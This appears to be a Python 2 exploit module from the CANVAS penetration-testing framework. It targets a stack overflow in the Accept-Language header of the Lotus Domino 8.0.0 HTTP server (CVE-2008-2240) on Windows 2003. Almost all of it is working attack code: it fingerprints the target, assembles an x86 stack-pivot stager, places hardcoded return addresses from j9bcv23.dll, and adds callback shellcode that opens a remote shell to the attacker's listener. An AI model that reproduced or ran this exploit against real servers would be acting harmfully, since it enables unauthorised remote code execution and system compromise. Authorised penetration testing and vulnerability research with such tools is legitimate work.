#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


import sys

if "." not in sys.path: sys.path.append(".")

import os
import getopt
import socket
import canvasengine
import time

from exploitutils import *
from tcpexploit   import tcpexploit
from MOSDEF       import mosdef
from encoder      import chunkedaddencoder

NAME         = "Lotus Domino 8.0.0 HTTP Server - Accept-Language Overflow"
DESCRIPTION  = "Lotus Domino 8.0.0 HTTP Server - Accept-Language Overflow"
DOCUMENTATION= {}

VERSION      = "1.0"
GTK2_DIALOG  = "dialog.glade2"

PROPERTY            = {}
PROPERTY['TYPE']    = "Exploit"
PROPERTY['SITE']    = "Remote"
PROPERTY['ARCH']    = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003" ]

DOCUMENTATION                 = {}
DOCUMENTATION['VENDOR']       = "IBM"
DOCUMENTATION['Date public']  = '05/20/2008'
DOCUMENTATION['CVE Name']     = 'CVE-2008-2240'
DOCUMENTATION['CVE Url']      = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2240'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['References']   = 'http://osvdb.org/show/osvdb/45415'
DOCUMENTATION['Repeatability']= 'One-Shot'
DOCUMENTATION['Notes']        = ''

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port       = 80
        self.host       = ""
        self.shellcode  = "\xcc" * 298
        self.badstring  = "\x00\r\n"
        self.version    =  1
        self.name       = NAME        
        self.setVersions()
        
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Windows 2K3", 0x41414141)


    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.shellcode = self.createWin32Shellcode(self.badstring,host,port)
                
        return 
    
    def test(self):
        """
        We have to pull in the whole homepage and look for the Domino Notes 8 string. 
        No specific version or sub-version can be detected on a remote Domino Notes machine,
        but this will get us close.
        """
        self.getargs()
        
        import libs.spkproxy as spkproxy

        fd   = spkproxy.urlopen("http://"+self.target.interface+':%s'%self.port+"/", hostname=self.target.interface, entireresponse=True)
        data = fd.read()
        
        # Present in the Server: header
        if data.count( "Lotus-Domino" ):            
            if "Domino 8" in data:
                self.log("Detected Lotus Domino 8.x running on remote host.")
                return 1
            else:
                self.log("Couldn't determine Lotus Domino server version.")
                return 0
        else:
            
            self.log("Remote host not running Lotus Domino.")
            return 0
        
        return 0
    
    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))        
        
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        
        try:
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        except:
            self.log("Could not connect")
            self.setInfo("%s attacking %s:%d - done (failed: could not connect!)"%(NAME,self.host,self.port))
            return 0

        s.sendall(sploitstring)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))            
        return 1
        
    def makesploit(self):
        sploitstring    = ""
        language        = "A" * 148
        
        """

        This stager prevents a few problems:
        1. Tolower on our shellcode, plus no nulls, or \r\n 
        2. Change ESP - we don't have enough room on the stack for an encoder 
           Pull pointer off of ESP and jump to there.
           What we really wanted to jump to is
           (esp+0x4cc)-0x494
        """
        stager           ="""addl $0x6cc33333,%esp
subl $0x6cc32e67, %esp
movl (%esp), %esp
subl $0x6cc33333,%esp
addl $0x6cc32e9f,%esp
jmp %esp"""

        stager          = mosdef.assemble( stager, 'x86' )
               
        
        """
        rw_addr  - R/W address and needs to have room (+0x1c0) for writing
        func_ptr - valid pointer, and needs +0x20 to be a valid pointer as well
        
        Both addresses live in j9bcv23.dll's .data
        """
        calc_val       = 0xffffffff
        rw_addr        = 0x7f94f194   #j9bcv23.7f94f194
        calc_val2      = 0x01010101
        jmp_esp        = 0x63228437   
        func_ptr       = 0x7f94f0fc   #j9bcv23.7f94f0fc

        calc_offset    = 56
        rw_offset      = 68
        calc_offset2   = 80
        rw_offset2     = 104
        jmp_esp_offset = 112
        
        language       = stroverwrite( language, intel_order(calc_val ), calc_offset )
        language       = stroverwrite( language, intel_order( rw_addr ), rw_offset )
        language       = stroverwrite( language, intel_order(calc_val2), calc_offset2 )
        language       = stroverwrite( language, intel_order( func_ptr ), rw_offset2 )
        language       = stroverwrite( language, intel_order( jmp_esp ), jmp_esp_offset )
        language       = stroverwrite( language, intel_order( rw_addr ), jmp_esp_offset+4)
        
        language      += stager
        language      += "\x90" * ( 1000 - len(self.shellcode) )
        language      += self.shellcode
 
        sploitstring   = "GET /iNotes/Forms6.nsf/?%ff HTTP/1.0\r\n"  
        sploitstring  += "Host:%s\r\n" % self.target.interface
        sploitstring  += "Accept-Language: %s\r\n" % language
        sploitstring  += "Connection: Close\r\n"
        sploitstring  += "Cache-Control: no-cache\r\n\r\n"

        self.log(sploitstring)
        
        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
